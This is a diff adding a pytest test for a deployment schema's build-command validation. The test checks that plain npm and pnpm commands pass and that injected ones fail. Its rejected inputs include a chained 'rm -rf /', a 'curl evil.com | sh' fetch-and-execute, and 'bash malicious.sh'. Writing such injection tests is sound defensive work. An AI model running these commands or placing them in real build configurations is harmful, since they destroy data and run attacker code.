@@ -93,6 +93,31 @@ def test_build_failure_self_healing():
         assert "tailwind-merge" in pkg_data["dependencies"]
 
 
+def test_deployment_build_command_sanitization():
+    """F-11 & F-02: DeploymentBase must reject shell injections and untrusted build commands."""
+    import pytest
+    from pydantic import ValidationError
+    from app.schemas.deployment import DeploymentBase
+
+    # 1. Valid commands pass
+    d1 = DeploymentBase(project_name="my-app", build_command="npm run build")
+    assert d1.build_command == "npm run build"
+
+    d2 = DeploymentBase(project_name="my-app", build_command="pnpm build")
+    assert d2.build_command == "pnpm build"
+
+    # 2. Command chaining / semicolons fail
+    with pytest.raises(ValidationError):
+        DeploymentBase(project_name="my-app", build_command="npm run build; rm -rf /")
+
+    with pytest.raises(ValidationError):
+        DeploymentBase(project_name="my-app", build_command="npm run build && curl evil.com | sh")
+
+    # 3. Disallowed binary / shell invocation fails
+    with pytest.raises(ValidationError):
+        DeploymentBase(project_name="my-app", build_command="bash malicious.sh")
+
+
 if __name__ == "__main__":
     test_deployment_auditor_frontend_heal()
     print("test_deployment_auditor_frontend_heal: PASSED")
